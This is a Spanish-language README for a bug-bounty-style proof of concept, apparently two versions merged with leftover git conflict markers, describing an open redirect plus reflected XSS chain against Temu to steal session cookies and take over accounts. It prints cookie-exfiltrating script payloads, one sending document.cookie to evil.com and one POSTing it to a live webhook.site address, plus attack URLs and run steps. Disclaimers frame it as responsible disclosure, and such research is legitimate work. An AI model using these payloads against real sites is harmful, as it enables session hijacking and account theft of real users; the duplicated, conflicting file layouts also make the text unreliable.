
## 📌 Descripción del Proyecto

`temu-vuln-hunter-pro` es una prueba de concepto profesional enfocada en demostrar cómo múltiples fallos de seguridad pueden combinarse para obtener un impacto crítico:

- 🧩 **Redirección Abierta (Open Redirect)**
- 💥 **XSS Reflejado**
- 🍪 **Robo de Cookies**
- 👤 **Toma de Cuenta Remota**

Este tipo de ataque encadenado permite que un atacante genere un solo enlace malicioso capaz de redirigir a un usuario a un payload XSS y así capturar su cookie de sesión.

---

## 🧪 Archivos Incluidos

📁 temu-vuln-hunter-pro
├── main.py # Script para automatizar y lanzar el PoC
├── payloads/
│ └── xss-openredirect.html # HTML con payload XSS
├── reports/
│ └── temu_xss_redirect_report.md # Informe profesional del hallazgo
├── screenshots/
│ └── poc1.png # Captura de pantalla del ataque exitoso
└── README.md # Este archivo



---

## 🚀 Ejecución del PoC

Asegúrate de tener Python 3 instalado. Luego:

git clone https://github.com/Jonathanjimenez123/temu-vuln-hunter-pro.git
cd temu-vuln-hunter-pro
python3 main.py
Esto abrirá el payload localmente y simulará la explotación para demostrar cómo se roba la cookie del usuario víctima.

💡 Concepto del Ataque
El atacante crea una URL con redirección abierta en Temu:

https://temu.com/redirect?to=https://evil.com/xss-openredirect.html
La víctima hace clic en ese enlace.

El navegador carga el archivo xss-openredirect.html, que contiene un script malicioso:

<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
Se roba la cookie de sesión y se envía al servidor del atacante.

El atacante reutiliza esa cookie y toma control de la cuenta de la víctima.

📸 Evidencia Visual

📄 Informe de Vulnerabilidad
Puedes leer el informe técnico detallado en reports/temu_xss_redirect_report.md, listo para ser enviado a HackerOne, Bugcrowd o el Google VRP en caso de participar en programas de recompensas.

⚠️ Descargo de Responsabilidad
Este proyecto ha sido creado con fines educativos y de responsible disclosure. No está diseñado para ser usado en actividades ilegales. El autor no se responsabiliza por su uso indebido.
Siempre reporta vulnerabilidades de forma ética y profesional.

📬 Contacto
Autor: Jonathan Jiménez

GitHub: @Jonathanjimenez123

Alias HackerOne: jimenez7@wearehackerone.com

Encabezado de Investigación: X-HackerOne-Investigación: jimenez7

⭐ Licencia
MIT © 2025 Jonathan Jiménez
=======
#📄 Contenido de README.md:

# 🛡️ temu-vuln-hunter-pro

> PoC profesional para explotar una vulnerabilidad crítica de Open Redirect + XSS reflejado en **Temu**, demostrando robo de cookies y escalada a toma de cuenta.

---

## 🚨 Descripción

Este proyecto demuestra una cadena de ataque real combinando:

#- ✅ Redirección abierta (`open redirect`)
#- ✅ XSS reflejado desde servidor externo
#- ✅ Robo de cookies vía JavaScript malicioso
#- ✅ Potencial toma de control de cuentas Temu

---

## 🔍 Estructura del Proyecto

temu-vuln-hunter-pro/
├── public/
│ └── poc.html # Página maliciosa que roba cookies
├── server.py # Servidor Flask que simula redirección
├── requirements.txt # Dependencias del proyecto
├── docs/
│ └── report.txt # Informe técnico completo para HackerOne
└── README.md # Este documento

---

## 💥 Payload usado

```html
<script>
fetch("https://webhook.site/32a0eb40-6f73-46d8-ae79-42f7535375e2", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({ cookie: document.cookie })
});
</script>
Este payload se ejecuta en poc.html después de que Temu redirige al atacante.

#🧪 Pasos para Reproducir

Visita este enlace:

https://www.temu.com/universal-link?redirect=https://temu-vuln-hunter-pro.vercel.app/redirect?url=https://webhook.site/...
El sistema redirige automáticamente al dominio del atacante.

Se ejecuta código malicioso en poc.html y la cookie se envía a un webhook externo.

#⚙️ Requisitos para correr localmenter

# Clonar el repositorio

git clone https://github.com/Jonathanjimenez123/temu-vuln-hunter-pro.git
cd temu-vuln-hunter-pro

# Instalar dependencias

pip install -r requirements.txt

# Ejecutar servidor Flask

python server.py

#📄 Reporte Técnico

Consulta el archivo docs/report.txt para ver el informe completo enviado a HackerOne, incluyendo impacto, PoC y solución sugerida.

#🧠 Autor Jonathan Jiménez
#💻 Alias HackerOne: jimenez7
#✉️  Email: jimenez7@wearehackerone.com

#⚠️ Disclaimer

Este proyecto es una prueba de concepto creada únicamente con fines educativos y de investigación. No está destinado a usarse con fines maliciosos. Todo reporte se ha hecho bajo los lineamientos éticos del programa HackerOne.

>>>>>>> 14b4965 (🚨 PoC crítica: Open Redirect + XSS + Account takeover en Temu)
